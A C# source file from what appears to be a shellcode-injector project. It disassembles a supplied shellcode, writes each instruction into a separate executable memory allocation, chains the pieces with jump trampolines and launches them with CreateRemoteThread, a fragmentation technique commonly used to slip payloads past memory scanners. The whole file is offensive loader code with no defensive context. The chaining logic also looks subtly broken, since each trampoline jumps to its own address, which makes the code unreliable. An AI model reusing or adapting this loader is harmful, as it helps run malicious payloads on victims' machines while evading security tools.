using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace shinjector.Casos
{
    class Test1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out IntPtr lpThreadId);


        public static void Inject(byte[] shellcode)
        {


            SharpDisasm.ArchitectureMode mode = SharpDisasm.ArchitectureMode.x86_64;
            // Configure the translator to output instruction addresses and instruction binary as hex
            SharpDisasm.Disassembler.Translator.IncludeAddress = true;
            SharpDisasm.Disassembler.Translator.IncludeBinary = true;
            var disasm = new SharpDisasm.Disassembler(
               shellcode,
               mode, 0, true);

            List<byte[]> l = new List<byte[]>();
            // Disassemble each instruction and output to console
            foreach (var insn in disasm.Disassemble())
                //Console.Out.WriteLine(insn.ToString());
                l.Add(insn.Bytes);

            l.Reverse();

            var ptr = writeInstructions(l[0]);
            l.RemoveAt(0);
            foreach(var i in l)
            {
                byte[] asm = i;
                int originalLength = asm.Length;
                Array.Resize<byte>(ref asm, originalLength + 13);
                ptr = writeInstructions(asm);
               
                if (ptr != IntPtr.Zero)
                {
                    unsafe
                    {

                        byte* a = (byte*)ptr.ToPointer();
                        *(a + originalLength) = 0x49;
                        *(a + originalLength + 1) = 0xBB;
                        *((ulong*)(a + originalLength + 2)) = (ulong)ptr.ToInt64();
                        *(a + originalLength + 10) = 0x41;
                        *(a + originalLength + 11) = 0xFF;
                        *(a + originalLength + 12) = 0xE3;

                    }
                }
            }
             

            IntPtr hthread = CreateRemoteThread((IntPtr)(-1), IntPtr.Zero, 0, ptr, IntPtr.Zero, (uint)0, out var _);

        }

        private static IntPtr writeInstructions(byte[] ins)
        {
            IntPtr baseAddress = VirtualAllocEx((IntPtr)(-1), IntPtr.Zero, (uint)ins.Length, 0x00002000 | 0x00001000, 0x40);

            if (baseAddress == IntPtr.Zero)
                return baseAddress;

            bool r = WriteProcessMemory((IntPtr)(-1), baseAddress, ins, (uint)ins.Length, out var _);
            if (r == false)
                baseAddress = IntPtr.Zero;

            return baseAddress;
        }
    }
}
